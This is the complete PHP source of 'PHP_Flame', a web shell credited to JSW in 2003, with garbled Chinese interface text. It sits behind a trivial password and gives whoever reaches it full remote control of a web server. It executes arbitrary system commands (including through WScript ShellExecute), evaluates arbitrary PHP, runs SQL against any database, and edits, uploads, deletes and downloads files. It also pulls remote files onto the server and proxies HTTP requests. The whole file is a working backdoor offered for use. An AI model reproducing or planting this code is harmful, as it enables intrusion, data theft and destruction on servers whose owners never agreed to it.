<?
$psw="1";
session_start();
if ($_REQUEST[passwd] !== $psw) {
?>
<form method="POST" action="?">
  <p>���������룺<input type="password" name="passwd" size="42" value=""></p>
  <p><input type="submit" value="�ύ" name="B2"></p>
</form>
<?
exit; 
}else {setcookie("passwd",$_REQUEST[passwd]);}
?>
<?
/*error_reporting(0);*/
$time_start = getmicrotime();
$php_self=$HTTP_SERVER_VARS['PHP_SELF'];
// ��������� register_globals = off �Ļ����¹���
if ( function_exists('ini_get') ) {
    $onoff = ini_get('register_globals');
} else {
    $onoff = get_cfg_var('register_globals');
}
if ($onoff != 1) {
    @extract($_POST, EXTR_SKIP);
    @extract($_GET, EXTR_SKIP);
}
if ($action=="download"){
    if (!@is_file($_GET['file_name']))
    echo"��Ҫ�µ��ļ�������";
    $filename = basename($_GET['file_name']);
    $filename_info = explode('.', $filename);
    $fileext = $filename_info[count($filename_info)-1];
    header('Content-type: application/x-'.$fileext);
    header('Content-Disposition: attachment; filename='.$filename);
    header('Content-Description: PHP3 Generated Data');
    readfile($_GET['file_name']);
    exit;
}
if($action=="eval"){
    if ($tem){
        $tem=stripslashes($tem);
        eval ("?>".$tem."<?");
    }
    ?>
    <form method="POST" action="<?echo $php_self;?>"><p></p><p>
    <input type="hidden" value="eval" name="action">
    <textarea rows="17" name="tem" cols="95" value=""><?echo $tem;?></textarea><br><br>
    <input type="hidden" value="eval" name="action">
    <input type="submit" value="�ύ" name="B1"><input type="reset" value="ȫ����д" name="B2"></p>
    </form>
    <?
    exit;
}
if($action=="listdir"){
    echo "Site��";echo("$_SERVER[SERVER_NAME]"); //����������
    echo "<BR>Path��";echo($_SERVER[PATH_TRANSLATED]); //���ص�ǰ�ļ�·��
    echo "<br>";
    if($dir==""){$dir=".";} //$dirΪ��Ҫ���Ե�·��
    $tem_a=list_dir( $dir);
    echo "<br><font color=blue>�ļ��� ".$tem_a[0]." ��</font>";
    echo "<br><font color=blue>�ļ� ".$tem_a[1]." ��</font><br><br><br><br>"; }
    ?>
    <?if ($action=="http") {
        if(!($url)){
            echo "���ӣ�<br>.php?action=http&url=http://www.xfocus.net/<br>.php?action=http&url=http://www.xxxx.com/list.php?id=600<br>
            ��URLΪĿ¼ʱ��Ҫ��Ŀ¼����롰/��";
            exit;
        }
        $url=str_replace("\\","/",$url);
        $f=@fopen($url,"r");  //���ļ�
        $a="";
        if($f)
        {
            while(!feof($f))
            $a.=@fread($f,8000);  //��ȡ�ļ�
            fclose($f);
        }
        $rooturl = preg_replace("/(.+\/)(.*)/i","\\1",$url);
        $a = preg_replace("/(src[[:space:]]*=['\"])([^h].*?)/is","\\1$rooturl\\2",$a);
        $a = preg_replace("/(src[[:space:]]*=)([^h'\"].*?)/is","\\1$rooturl\\2",$a);
        $a = preg_replace("/(action[[:space:]]*=['\"])([^h].*?)/is","\\1$php_self?action=http&url=$rooturl\\2",$a);
        $a = preg_replace("/(action[[:space:]]*=)([^h'\"].*?)/is","\\1$php_self?action=http&url=$rooturl\\2",$a);
        $a = preg_replace("/(<a.+?href[[:space:]]*=['\"])([^h].*?)/is","\\1$php_self?action=http&url=$rooturl\\2",$a);
        $a = preg_replace("/(<a.+?href[[:space:]]*=[^'\"])([^h].*?)/is","\\1$php_self?action=http&url=$rooturl\\2",$a);
        $a = preg_replace("/(link.+?href[[:space:]]*=[^'\"])(.*?)/is","\\1$rooturl\\2",$a);
        $a = preg_replace("/(link.+?href[[:space:]]*=['\"])(.*?)/is","\\1$rooturl\\2",$a);
        echo $a;
        exit;
    }?>
    <?if ($action=="info") {
        phpinfo();
        exit;
    }?>
    <?if ($action=="webdown") {
        $thedir=$_REQUEST['thedir'];
        if (!$filename)
        {
            echo "<br>����URL��ַ�������ļ���ַ����:<br><br>
            .php?action=webdown&thedir=./soft&filename=http://www.xxx.com/winrar.exe<br>
            ���� ./soft Ϊ���������ļ���Ŀ¼��<br> http://www.xxx.com/winrar.exeΪҪ������ļ�<br>";
            echo "��ǰĬ�ϵı���Ŀ¼Ϊ".$thedir;
            exit;
        }
        else{
            $fp = fopen($_GET['filename'], 'rb'); //���ļ�
            $data = $tmp = '';
            while ( true ) {
                $tmp = fgets($fp, 1024);
                if ( 0 === strlen($tmp) ) {
                    break;
                }
                $data .= $tmp;
            }
            fclose($fp);
            $file=preg_replace("/^.+\//","",$filename);
            //write
            $fp = fopen("./$thedir/$file", 'wb');
            fwrite($fp, $data);
            fclose($fp);
            echo "�ɹ�д���ļ�".$thedir."/".$file;
        }
        exit;
    }?>
    <?
    if( !isset($_SESSION['boot'])){
        session_register('boot');
        $_SESSION['boot']=".";
    }
    if ( isset($_POST['boot'])) {
        $_SESSION['boot']=$_POST['boot'];
    }
    ?>
    <style>
    input {BORDER-RIGHT: #888888 1px solid; BORDER-TOP: #888888 1px solid; BACKGROUND: #ffffff; BORDER-LEFT: #888888 1px solid; BORDER-BOTTOM: #888888 1px solid; FONT-FAMILY: "Verdana", "Arial"font-color: #ffffff;FONT-SIZE: 9pt;}
    body{font-family: ����;   font-size: 10pt}
    a {font-family: ����; font-size: 9pt; color: #000000; text-decoration: none }
    a:hover{ font-family: ����; color: #6595d6; text-decoration: none }
    table {    font-size: 9pt;    text-align: center;    height: 20pt;}
    input {    height: 12pt;font-size: 9pt;}
    .tr0 {background-color: #e0e0e0; font-weight: bold;}
    .tr1 {background-color: #ffffff;}
    .tr2 {background-color: #f5f5f5;}
    </style>
    <head>
    <title>PHP_Flame</title>
    </head>
	<?if ($action=="mysql") {
		extract($_POST);
?>
<form method="post" action="<?echo $HTTP_SERVER_VARS['php_self'];?>?action=mysql">  
Host: <input name="mysql_hostname" value="<?echo $mysql_hostname;?>" type="text"  class="input" size="20" >

 User: <input name="mysql_username" value="<?echo $mysql_username;?>" type="text"  class="input" size="15" >
 Pass: <input name="mysql_passwd" value="<?echo $mysql_passwd;?>" type="password"  class="input" size="15" >
 DB: <input name="mysql_dbname" value="<?echo $mysql_dbname;?>" type="text"  class="input" size="15" ><br>
<br>
������SQL���<br>
 <textarea name="post_sql" cols="50" rows="10"><?echo stripslashes($post_sql);?>
</textarea>
          <br>  <br>
          <input name="" type="submit" value="ִ��">
        </form><br>������Ϣ��
<?
if ($post_sql) {

$link = mysql_connect ($mysql_hostname,$mysql_username,$mysql_passwd) or (mysql_error());

mysql_select_db("$mysql_dbname",$link) or (mysql_error());

$query=stripslashes($post_sql);

$result = mysql_query($query, $link)  or (mysql_error());

?>
<br>

<textarea name="post_sql" cols="80" rows="15">

<?
echo ($result) ? "SQL���ɹ�ִ��:\n\n" : "����:\n\n ".mysql_error();

while ($row =  mysql_fetch_array ($result)) {
print_r ($row);
}
mysql_free_result($result);
}
?>    
</textarea>
<?exit;}

    if ($action=="search") {
		if (!$rootpath) $rootpath=".";
		?>
    <form method="POST" action="<?echo $php_self;?>?action=search">
    <p>�ؼ��֣�  <input type="text" name="key" size="20" value="<? echo $key; ?>"></p>
    <p>��ʼĿ¼��<input type="text" name="rootpath" size="42" value="<? echo $rootpath; ?>"></p>
	<p>�������ͣ� �ļ���<input type="radio" value="file_name" checked name="search_tyle"> �ļ�����<input type="radio" value="file_data" name="search_tyle"></p>
    <p><input type="submit" value="�ύ" name="B2"></p>
    </form>
    <?php
    if (function_exists("set_time_limit") && !get_cfg_var('safe_mode')){
        set_time_limit(600);
		}
        function get_msg($path) {
			global $search_tyle;
			$aaa=array("rar","zip","jpg","bmp","gif","exe","mp3","mpg","rm","rmvb","wma","wmv");
            global $key, $i;
            $handle = opendir($path);
            while ($filename = readdir($handle)) {
                //echo $path."/".$filename."<br>";
                $newpath = $path."/".$filename;
				if(ereg($key,$newpath)) echo "��<a href=\"$newpath\">$m</a><BR><BR>" .$newpath."</a><BR><br>";
                if (is_file($newpath)) {
					$tyle_tmp=strtolower(array_pop(explode(".",$newpath)));
                    if(!in_array($tyle_tmp,$aaa) && $search_tyle=="file_data") //�趨��Ҫ��ʾ���ļ�����
                    {
                        $msg = file_get_contents($newpath);
                        match_show($key, $msg, $newpath, $filename);
                    }
                }
                if (is_dir($path."/".$filename) && ($filename != ".") &&  ($filename != "..")) {
                    //echo "<BR><BR><BR>".$newpath."<BR><BR><BR>";
                    get_msg($path."/".$filename);
                }
            }
            closedir($handle);
            return $i;
        }
        
        function match_show($key, $msg, $newpath, $filename) {
            global $ar, $i;
            $key = chop($key);
            if($key) { $check_type = preg_match("/\.html?$/", $filename);
            if($check_type) {$title = getHtmlTitle($msg);}
            $msg = preg_replace("/<style>.+<\/style>/is", "", $msg);
            $msg = preg_replace("/<[^>]+>/", "", $msg);
            $value = preg_match("/.*$key.*/i", $msg, $res);
            if($value) {
                
                $res[0] = preg_replace("/$key/i", "<FONT COLOR=\"red\">$key</FONT>", $res[0]);
                $k = $res[0];
                $k = strrchr($k, "<FONT");
                $k = substr($k, 1, 100);
                $k = "<FONT COLOR=\"red\">$key<$k";
                if($title) {$m = $title;} else {$m = $filename;}
                $i++;
                $link = $newpath;
                $ar[] = "$i.��<a href=\"$link\">$m</a><BR><BR>" .$k."<BR><br>";
            }
        }
    }
    
    function getHtmlTitle($msg) {
        
        /* Locate where <TITLE> is located in html file. */
        $lBound = strpos($msg, '<title>') + 7; //7 is the lengh of <TITLE>.
        
        if ($lBound < 1)
        return;
        
        /* Locate where </TITLE> is located in html file. */
        $uBound = strpos($msg, '</title>', $lBound);
        
        if ($uBound < $lBound)
        return;
        
        /* Clean HTML and PHP tags out of $title with the madness below. */
        $title = ereg_replace("[\t\n\r]", '', substr($msg, $lBound, $uBound - $lBound));
        $title = trim(strip_tags($title));
        
        if (strlen($title) < 1) //A blank title is worthless.
        return;
        
        return $title;
    }
    if (!$key) {
		echo "*PHP_Flame(Version:Security)";
        echo "<br>*Site��";echo("$_SERVER[SERVER_NAME]"); //����������
        echo "<BR>*Path��";echo($_SERVER[PATH_TRANSLATED]); //���ص�ǰ�ļ�·��
        echo "<br>";
        echo "*������ؼ���......";
		exit;
	}
    $i = get_msg($rootpath);
    if (empty($page)) $page=1;
    $maxresult=($page*20);
    $resultcount = count($ar);
    if ($resultcount%20==0) $maxpageno=$resultcount/20;
    else $maxpageno=floor($resultcount/20)+1;
    if ($page>$maxpageno) { $page=$maxpageno; $pagemax=$resultcount-1; $pagemin=max(0,$result_count-20);}
    elseif ($page==1) {$pagemin=0; $pagemax=min($result_count-1,20-1); }
    else { $pagemin=min($resultcount-1,20*($page-1)); $pagemax=min($resultcount-1,$pagemin+20-1); }
    $maxresult=min($maxresult,$resultcount);
    echo "<p align=\"center\">";
    echo "�������";
    echo "</p><hr>";
    for ($i=max(0,$maxresult-20); $i<$maxresult; $i++) {
        print $ar[$i];
    }
    echo "<hr><p align=\"center\">";
    echo " �Ѿ��������� $resultcount ����Ϣ";
    $nextpage=$page+1;
    $previouspage=$page-1;
    echo " --- [ <a href='$php_self?action=search&key=$key&page=$nextpage'  target='_self'>������ 20 �����</a> ]";
    echo " [ <a href='$php_self?action=search&key=$key&page=$previouspage'  target='_self'>������ 20 �����</a> ]";
    exit;
    ?>
    <?}?>
    <?
    if ($action=="cmd") { ?>
    <form name="form1" method="post" action="<?= $PHP_SELF ?>?action=cmd">
    <select name="method">
    <option value="system" <? if ($method=="system") { echo "selected"; } ?>>system</option>
    <option value="passthru" <? if ($method=="passthru") { echo "selected"; } ?>>passthru</option>
    <option value="show_source" <? if ($method=="show_source") { echo "selected"; } ?>>show_source</option>
    <option value="opendir" <? if ($method=="opendir") { echo "selected"; } ?>>opendir</option>
    <option value="popen" <? if ($method=="popen") { echo "selected"; } ?>>popen</option>
	<option value="WScript" <? if ($method=="WScript") { echo "selected"; } ?>>WScript</option>
    </select><br>
    
    <input type="text" name="cmd" size="40" value="<?= $cmd; ?>">
    <input type="submit" name="Submit" value="<?=$method?>">
    <br>
    </form>
    <?
    if (!$method) { $method="system"; }
    if (!$cmd) {
        echo "* PHP_Flame (Version: Progress )<br>";
        echo "* Author: JSW<br>";
        echo "* safe_mode:";if (get_cfg_var("safe_mode"))echo"on<br>";else echo"off<br>";
        echo "* disable_functions:";$dis_func=get_cfg_var("disable_functions");
        if ($dis_func=="")
        {
            echo("<font color=red><b>no value</b></font>");
        }
        else
        {
            $dis_func=str_replace(" ","<br>",$dis_func);
            $dis_func=str_replace(",","<br>",$dis_func);
            echo("$dis_func");
        }
        
    }
    echo "<br><pre>";
    if ($method=="system") {
        system("$cmd 2>&1");
    }
    if ($method=="passthru") {
        passthru("$cmd 2>&1");
    }
    if ($method=="opendir") {
        $h=opendir($cmd);
        while($file=readdir($h)) {
            echo "$file\n";
        }
    }
    if ($method=="show_source") {
        if (show_source($cmd)) {
            //echo "<pre>";
            //echo show_source($file);
            //echo "</pre>";
        } else {
            echo "<script> alert(\"unable to read file: $file using: show_source\"); </script>";
        }
        
    }
    if ($method=="popen") {
        $pp = popen('$cmd 2>&1', 'r');
        $read = fread($pp, 2096);
        echo $read;
        pclose($pp);
    }
	if ($method='WScript') {
	$w_shell= &new COM('S'.'h'.'el'.'l.Ap'.'pl'.'ication');
	$a = $w_shell->ShellExecute($cmd);
	echo ($a=='0') ? "�����Ѿ��ɹ�ִ��!" : "��������ʧ��!";
	
	
	}
    echo "</pre>";
    exit;
}
?>
<?php
if($dir=="")
$dir="./";
if($tools==upload)
{
    for($i=1;$i<21;$i++)
    {
        $temp1="userfile".$i;
        $temp2="userfile".$i."_name";
        $source=$$temp1;
        $source_name=$$temp2;
        if(@$source!="")
        {
            @$v=file_exists($filedir);
            if(!$v)
            {
                mkdir(@$filedir,0777);
            }
            @chmod($filedir,0777);
            if(file_exists("$filedir/$source_name")=="1")
            {
                if($up_flag=="y")
                {
                    @unlink($filedir/$source_name);
                    @copy($source,"$filedir/$source_name");
                    echo $source_name."�Ѹ����ϴ�<br>";
                }
                else
                echo $source_name."�������ϴ�!<br>";
            }
            else
            {
                @copy($source,"$filedir/$source_name");
                echo $source_name."���ϴ�<br>";
            }
        }
    }//end for
    echo"
    <html>
    <head>
    <script language=\"javascript\">
    function setid()
    {
        str='<br>';
        if(!window.uploadForm.upcount.value||window.uploadForm.upcount.value>20||window.uploadForm.upcount.value==0)
        window.uploadForm.upcount.value=1;
        for(i=1;i<=window.uploadForm.upcount.value;i++)
        str+='�ļ�'+i+':<input type=\"file\" name=\"userfile'+i+'\" style=\"width:400\" class=\"tx1\"><br><br>';
        window.upid.innerHTML=str+'<br>';
    }
    </script>
    </head>
    <body>
    <table width=\"550\" border=\"1\" cellspacing=\"0\" cellpadding=\"5\" align=\"center\">
    <form name=\"t\" method=\"get\" action=\"?\">
    <tr class=\"t2\">
    <td><li> 1.ָ���ϴ�Ŀ¼(Ĭ��Ϊ����������Ŀ¼)
    <input type=\"hidden\" name=\"tools\" value=\"upload\">
    <input type=\"text\" name=\"dir\">
    <input type=\"submit\" value=\"ȷ��\" name=\"t\"></td></li>
    </tr>
    </form>
    <form name=\"uploadForm\" method=\"post\" action=\"?tools=upload&dir=$dir\" enctype=\"multipart/form-data\">
    <tr class=\"t2\">
    <td>
    <li> 2.��Ҫ�ϴ��ĸ���(�������ֵ 20)
    <input type=\"text\" name=\"upcount\" class=\"tx\" value=\"1\">
    <input type=\"button\" name=\"Button\" class=\"bt\" onclick=\"setid();\" value=\"�趨\">
    </li>
    <li> 3.ȫ���ļ��������ϴ�: <input type=\"radio\" name=\"up_flag\" value=\"y\">��<input type=\"radio\" name=\"up_flag\" value=\"n\" checked>��
    </li>
    <br>
    <br>
    �����ļ������ϴ���: $dir
    <input type=\"hidden\" name=\"filedir\" class=\"tx\" value=\"$dir\">
    <a href=\"?\">����PHP_Flame</a>
    </td>
    </tr>
    <tr>
    <td id=\"upid\" height=\"122\"> �ļ�1:
    <input type=\"file\" name=\"userfile1\" style=\"width:400\" class=\"tx1\" value=\"\">
    </td>
    </tr>
    <tr>
    <td>
    <input type=\"submit\" name=\"upload\" value=\"�ϴ�\" class=\"bt\">
    <input type=\"reset\" name=\"reset\" value=\"��ִ\" class=\"bt\">
    </td>
    </tr></form>
    </table>
    </body>
    </html>";
    exit;}
    ?>
    <?
    top();
    if( isset($_GET['dir'])) $dir=$_GET['dir'];
    elseif( isset($_POST['dir'])) $dir=$_POST['dir'];
    else $dir=$_SESSION['boot'];
    switch ( $_REQUEST['act']){
        case "dir":
        open_dir($dir);
        break;
        case "file_edit_1":
        echo $_GET['file'];
        $fp=fopen($_GET['file'],"r");
        $tem=fread( $fp,filesize( $_GET['file']));
        $tem= str_replace("/textarea>","//textarea>",$tem);
        $tem= str_replace("/TEXTAREA>","//textarea>",$tem);
        $tem=str_replace("&nbsp;","[&nb&sp;]",$tem);
        $tem=str_replace("&NBSP;","[&nb&sp;]",$tem);
        ?>
        <br><center><a href="<?echo$php_self;?>?action=cmd&method=show_source&cmd=<? echo $_GET['file'];?>" target=_blank>�ļ�����</a>
        <form action="<? echo $php_self;?>" method="post">
        <textarea name="text" cols="100" rows="20"><?echo $tem;?>
        </textarea>
        <br>
        <input name="" type="submit" value="Submit">
        <input name="act" type="hidden" id="act" value="file_edit_2">
        <input name="filename" type="hidden" id="filename" value="<? echo $_GET['file'];?>">
        </form><center>
        <?
        break;
        case "file_edit_2":
        $tem = $_POST["text"];
        $tem = stripslashes( $tem);
        $tem= str_replace("//textarea>","/textarea>",$tem);
        $tem=str_replace("[&nb&sp;]","&nbsp;",$tem);
        $fp = fopen($_POST["filename"],"w");
        echo "�޸�".$_POST["filename"]."�ɹ�"."<br>";
        fwrite( $fp,$tem);
        fclose( $fp);
        open_dir( dirname($_POST['filename']));
        break;
        case "copy_file_1":
        ?>
        <form  action="<? echo $php_self;?>" method="post">
        <? echo "ԭ����".$_GET['file_name'];?><br>
        ������
        <input name="re_file_name" type="text" value="<? echo $_GET['file_name'];?>" size="<? echo 6+strlen( $_GET['file_name']);?>">
        <input name="act" type="hidden" value="copy_file_2">
        <input name="file_name" type="hidden" value="<? echo $_GET['file_name'];?>"><br>
        <input name="" type="submit" value="�ύ" style="background-color: #9cc5f8">
        </form>
        <?
        exit();
        break;
        case "copy_file_2":
        if( copy( $_POST['file_name'],$_POST['re_file_name'])) echo "���� ".$_POST['re_file_name']." �ļ��ɹ���<br>";
        else echo "���� ".$_POST['re_file_name']." �ļ�ʧ�ܡ�<br>";
        open_dir( dirname( $_POST['file_name']));
        break;
        case "rename_1":
        ?>
        <form  action="<? echo $php_self;?>" method="post">
        <? echo "ԭ����".$_GET['dir'];?><br>
        ������<input name="re_file_name" type="text" value="<? echo $_GET['dir'];?>" size="<? echo 6+strlen( $_GET['dir']);?>">
        <input name="act" type="hidden" value="rename_2">
        <input name="filename" type="hidden" value="<? echo $_GET['dir'];?>"><br>
        <input name="" type="submit" value="�ύ" style="background-color: #9cc5f8">
        </form>
        <?
        break;
        case "rename_2";
        if(rename( $_POST['filename'], $_POST['re_file_name'])) echo "�޸� ".$_POST['re_file_name']." �ļ����ɹ���<br>";
        else echo "�޸� ".$_POST['re_file_name']." �ļ���ʧ�ܡ�<br>";
        open_dir( dirname( $_POST['filename']));
        break;
        case "copy_dir_1":
        ?>
        <form  action="<? echo $php_self;?>" method="post">
        <? echo "ԭ����".$_GET['dir'];?><br>
        ������<input name="new_dir_name" type="text" value="<? echo $_GET['dir'];?>" size="<? echo 6+strlen( $_GET['dir']);?>">
        <input name="act" type="hidden" value="copy_dir_2">
        <input name="old_dir_name" type="hidden" value="<? echo $_GET['dir'];?>"><br>
        <input name="" type="submit" value="�ύ" style="background-color: #9cc5f8">
        </form>
        <?
        break;
        case "copy_dir_2":
        if (  $_POST['old_dir_name']==$_POST['new_dir_name']){
            echo "<font color=red>ԴĿ¼��Ŀ��Ŀ¼ͬ����</font><br>";
            break;
        }
        if ( is_dir( $_POST['new_dir_name'])){
            echo "<font color=red>Ŀ¼Ŀ¼�Ѵ��ڡ�</font><br>";
            break;
        }
        mkdir( $_POST['new_dir_name'], 0777);
        $tem = copy_dir( $_POST['old_dir_name'],$_POST['new_dir_name']);
        echo "�������ļ��У� ".$tem[0]." ��<br>";
        echo "�������ļ��� ".$tem[1]." ��<br>";
        open_dir( dirname( $_POST['filename']));
        break;
        case "mkdir":
        if( @mkdir($_POST['new_dir']."/".$_POST['new_dir_name'], 0777)) echo "�½��ļ��� ".$_POST['new_dir']."/".$_POST['new_dir_name']." �ɹ���<br>";
        else echo "�½��ļ���".$_POST['new_dir']."/".$_POST['new_dir_name']."ʧ�ܡ�<br>";
        open_dir( $_POST['new_dir']);
        break;
        case "rmdir":
        if ( @rmdir( $_GET['dir'])){
            echo "���ļ��� ". $_GET['dir']." �ɹ�ɾ����".$_GET['dir']."<br>";
        }
        else{
            $tem_a=delete_dir( $_GET['dir']);
            rmdir( $_GET['dir']);
            echo "ɾ���ļ��� ".$tem_a[0]." ����ɾ���ļ� ".$tem_a[1]." ����<br>";
            echo "�ǿ��ļ��� ". $_GET['dir']." �ɹ�ɾ����<br>";
        }
        open_dir( dirname( $_POST['filename']));
        break;
        case "unlink":
        if ( unlink($_GET['file'])){
            echo "�ɹ�ɾ���ļ���".basename( $_GET['file'])."<br>";
        }
        else{
            echo "ɾ���ļ���".basename( $_GET['file'])."���ɹ���<br>";
        }
        open_dir( dirname($_GET['file']));
        break;
        case "new_file":
        $new_file_name=$_POST['new_dir']."/".$_POST['new_file_name'];
        if ( is_file( $new_file_name)){
            echo "�ļ� ".$new_file_name." �Ѵ��ڡ�";
        }
        else {
            $f=fopen($new_file_name,'w');
            if ( $f) echo "�ļ� ".$new_file_name." �����ɹ���";
            else echo "�ļ� ".$new_file_name." ����ʧ�ܡ�";
        }
        open_dir( dirname( $_POST['new_dir']));
        break;
        default:
        $infos="1";
    }
    /////////////////////////////////////////////////
    
    /////////////////////////////////////////////////
    function open_dir( $dir){
        global $php_self;
        $num_dir=0;
        $num_file=0;
        
        if ( is_dir( $dir)) $d = dir( $dir);
        else{ $dir=dirname($dir); $d = dir( $dir);}
        echo "<TABLE style=\"BORDER-COLLAPSE: collapse\" width=\"98%\"   border=0 align=center><a href=\"$php_self?act=dir&dir=$d->path\">��ǰĿ¼��$d->path</a><table>";
        while ( $entry = $d->read()) {
            if( $entry=="." or $entry=="..") continue;
            $tem_curnt=$dir."/".$entry;
            if( is_dir( $tem_curnt)){ $dir_list[]=$entry; $num_dir++;}
            elseif( is_file( $tem_curnt)){ $file_list[]=$entry; $num_file++;}
        }
        $d->close();
        ?>
        <center>
        <table width="98%" cellspacing="1" cellpadding="1" bgcolor=#ffffff>
        <tr class="tr0">
        
        <td width="100" height="24">����</td>
        <td width="28">ɾ��</td>
        <td width="28">�༭</td>
        <td width="28">����</td>
        <td width="28">����</td>
        <td width="28">����</td>
        <td width="28">����</td>
        <td width="40">��С</td>
        <td width="100">ʱ��</td>
        </tr>
        
        <?
        $bgcolor=1;
        if( $dir_list){
            asort( $dir_list);
            foreach($dir_list as $val){
                //�����ļ���||�ļ���·����Ϊ��ʾ֮��
                if( $dir=="/") $dir_path=$dir.$val;
                elseif( $dir==".") $dir_path=$val;
                else $dir_path=$dir."/".$val;
                
                ?>
                <tbody>
                <tr <? $bgcolor++;if ($bgcolor % 2==1) echo "class=tr1";else echo "class=tr2";?> onmouseover="this.style.backgroundColor = '#e8e8e8'" onmouseout="this.style.backgroundColor = ''">
                <td height="19"><div align="left"><? echo "<font color='#FF8000'>����</font><a href=\"$php_self?act=dir&dir=$dir_path\"> $val</a><br>";?></div></td>
                <td><? echo "<a href=\"$php_self?act=rmdir&dir=$dir_path\">ɾ��</a><br>";?></td>
                <td> </td>
                <td><? echo "<a href=\"$php_self?act=rename_1&dir=$dir_path\">����</a><br>";?></td>
                <td> </td>
                <td><? echo "<a href=\"$php_self?act=copy_dir_1&dir=$dir_path\">����</a><br>";?></td>
                <td> </td>
                <td><? echo "<a href=\"$php_self?action=search&rootpath=$dir_path\" target=_blank>����</a>";?>
                </td>
                <td><?echo "<a href=\"$php_self?action=listdir&dir=$dir_path\" target=_blank>����Ŀ¼</a>";?> </td>
                </tr>
                </tbody>
                
                <?
            }
        }
        if( $file_list){
            asort( $file_list);
            foreach( $file_list as $val){
                //�����ļ���||�ļ���·����Ϊ��ʾ֮��
                if( $dir=="/") $dir_path="/".$val;
                elseif( $dir==".") $dir_path=$val;
                else $dir_path=$dir."/".$val;
                ?>
                <tbody>
                <tr <? $bgcolor++;if ($bgcolor % 2==1) echo "class=tr1";else echo "class=tr2";?> onmouseover="this.style.backgroundColor = '#e8e8e8'" onmouseout="this.style.backgroundColor = ''">
                
                <td><div align="left"><? echo "<font color='#FF8000'>����</font><a href=\"$dir_path\" target=_blank> $val</a><br>"; ?></div></td>
                <td><? echo "<a href=\"$php_self?act=unlink&file=$dir_path\" >ɾ��</a><br>"; ?></td>
                <td> <? echo "<a href=\"$php_self?act=file_edit_1&file=$dir_path\">�༭</a><br>"; ?></td>
                <td><? echo "<a href=\"$php_self?act=rename_1&dir=$dir_path\" >����</a><br>";?></td>
                <td><? echo "<a href=\"$php_self?action=download&file_name=$dir_path\">����</a><br>";?></td>
                <td><? echo "<a href=\"$php_self?act=copy_file_1&file_name=$dir_path\">����</a><br>";?></td>
                <td><? echo @fileperms( $dir_path);?></td>
                <td><div align="right"><? $filesize=filesize("$dir_path");echo $filesize?></div></td>
                <td><? $lastchanged = filectime("$dir_path"); $changeddate = date("Y-m-d H:i:s", $lastchanged);echo $changeddate;?></td>
                </tr>
                </tbody>
                <?
            }
        }
        ?>
        </table>
        </center>
        <?
        echo "<br><TABLE style=\"BORDER-COLLAPSE: collapse\"  width=\"98%\" borderColor=#888888 border=1 align=center>
        <TBODY>
        <TR>
        <TD>�����ļ��У�".$num_dir." | �����ļ���".$num_file."</TD></TR>
        <TR>
        <TD><a href=\"$php_self?tools=upload&dir=$dir\" target=_blank>�ϴ��ļ�����Ŀ¼��</a></TD></TR></TBODY></TABLE>";
    }
    ?>
    <br>
    <?if($infos)
    {
        check();
    }?>
    <TABLE style="BORDER-COLLAPSE: collapse"  width="98%" borderColor=#888888 border=1 align=center>
    <tr>
    <form  method="post" action="<? echo $php_self ?>">
    <td><div align="left">�½��ļ���
    <input name="act" type="hidden" id="act" value="new_file">
    <input name="new_dir" type="text" id="new_dir_name" size="<? echo 4+strlen($dir);?>" value="<? echo $dir; ?>">
    <input name="new_file_name" type="text" id="new_file_name">
    <input type="submit" name="Submit" value="ȷ��">
    </div>
    </td></form>
    </tr>
    <tr><form  method="post" action="<? echo $php_self ?>">
    <td><div align="left">�½��ļ��У�
    <input name="act" type="hidden" id="act" value="mkdir">
    <input name="new_dir" type="text" id="new_dir_name" size="<? echo 4+strlen($dir);?>" value="<? echo $dir; ?>">
    <input name="new_dir_name" type="text" id="new_dir_name">
    <input type="submit" name="Submit" value="ȷ��">
    </div>
    </td></form>
    </tr>
    </table>
    <br>
    <hr size=1 align="center" width=760>
    <center>
    <a href="http://linx.yeah.net" target=_blank>PHP_Flame (Version:Security)</font></a> <br>
    <a href="http://jsw.china12e.com" target=_blank>Copyright (c) 2003 JSW </font></a>
    <?
    $time_end = getmicrotime();
    $time = $time_end - $time_start;
    echo "<br>Processed in $time seconds<br>";
    ?>
    </center>
    <?
    function getmicrotime(){
        list($usec, $sec) = explode(" ",microtime());
        return ((float)$usec + (float)$sec);
    }
    /////
    function top(){
        global $dir;
        global $infos;
        global $act;
        global $php_self;
        echo "<br><TABLE style=\"BORDER-COLLAPSE: collapse\" width=\"98%\" borderColor=#888888  border=1 align=center>
        <TBODY><TR><TD>��������<a href=\"http://$_SERVER[SERVER_NAME]\"  title=���ʴ����� target=_blank>$_SERVER[SERVER_NAME]</a></TD></TR>
        <TR><TD>���ļ�����λ�ã�$_SERVER[PATH_TRANSLATED]</TD></TR>
        <TR><TD><a href=\"$php_self?act=dir&dir=$dir/../\">�ϼ�Ŀ¼</a> | <a href=\"$php_self?act=dir&dir=.\">��Ŀ¼</a> | <a href=\"$php_self?action=search&rootpath=$dir\" target=_blank>�ļ�����</a> | <a href=\"$php_self?dir=$dir&infos=1\" target=_blank>PHP��������</a> | <a href=\"$php_self?action=info\" target=_blank>phpinfo</a> | <a href=\"$php_self?action=mysql\" target=_blank>mysql</a></TD></TR><TR><TD>
        <a href=\"$php_self?action=eval\" target=_blank>���� PHP ����</a> |
        <a href=\"$php_self?action=cmd\" target=_blank>ִ��ϵͳ����</a> | <a href=\"$php_self?action=webdown&thedir=$dir\" target=_blank>�����ļ�</a> | <a href=\"$php_self?action=http\" target=_blank>HTTP ����</a> | <a href=\"$php_self?action=listdir&dir=$dir\" target=_blank>����Ŀ¼(ASP/PHP)</a></TD></TR>
        </TBODY></TABLE>";
        echo "<br><table style=\"BORDER-COLLAPSE: collapse\" width=\"98%\"   border=0 align=center><tr><FORM METHOD=POST ACTION=".$php_self."?act=dir><td align='left'>";
        echo "����Ŀ¼��<INPUT TYPE='text' NAME='boot' value=".$_SESSION['boot']." size="; print ( 4+strlen($_SESSION['boot']));echo ">";
        echo "<INPUT TYPE='submit' value='ȷ��'></td></FORM></tr></table>";
    }
    function delete_dir( $dir){
        static $dir_list =0;
        static $file_list =0;
        $d = dir($dir);
        while ( false !== ( $entry = $d->read())) {
            $tem_curnt=$dir."/".$entry;
            if ( $entry=="." or $entry=="..") continue;
            if ( is_dir( $tem_curnt)) {
                $dir_list[] = $tem_curnt;
                delete_dir( $tem_curnt);
                rmdir( $tem_curnt);
                echo "ɾ���ļ��� ".$tem_curnt." �ɹ���<br>";
                $dir_list++;
            }
            if ( is_file($tem_curnt)) {
                //            echo "�ļ�".$tem_curnt."<BR>";
                unlink($tem_curnt);
                $file_list++;
            }
        }
        $d->close();
        $tem[]=$dir_list;
        $tem[]=$file_list;
        return $tem;
    }
    ////////////////////////////////
